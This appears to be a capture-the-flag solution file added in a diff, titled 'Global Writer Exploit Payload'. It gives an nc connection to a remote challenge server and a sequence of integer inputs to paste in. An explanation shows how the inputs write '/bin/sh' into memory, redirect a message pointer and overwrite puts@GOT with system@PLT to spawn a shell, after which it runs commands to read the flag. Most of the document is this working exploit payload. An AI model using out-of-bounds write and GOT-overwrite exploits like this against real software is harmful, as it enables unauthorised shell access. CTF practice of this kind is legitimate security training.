@@ -1,0 +1,48 @@
+=====================================================
+GLOBAL WRITER EXPLOIT PAYLOAD
+=====================================================
+
+Connect to: nc 34.84.25.24 58554
+
+Then paste the following input line by line:
+
+0
+1852400175
+1
+6845231
+-22
+6295744
+-21
+0
+-40
+4196032
+-39
+0
+-1
+
+After this, you should have a shell. Execute:
+
+cat flag*
+ls -la
+pwd
+
+=====================================================
+EXPLANATION:
+=====================================================
+
+Step 1-2: Write "/bin/sh" string
+  values[0] = 0x6e69622f = 1852400175 = "/bin"
+  values[1] = 0x0068732f = 6845231    = "/sh\x00"
+
+Step 3-4: Point msg to our "/bin/sh" string  
+  msg[offset -22] = 0x6010c0 (low 32 bits of values base address)
+  msg[offset -21] = 0 (high 32 bits)
+
+Step 5-6: Overwrite puts@GOT with system@PLT
+  puts@GOT[offset -40] = 0x4006c0 (low 32 bits of system@PLT)
+  puts@GOT[offset -39] = 0 (high 32 bits)
+
+Step 7: Exit loop with -1
+  This triggers: puts(msg) -> system("/bin/sh")
+
+=====================================================
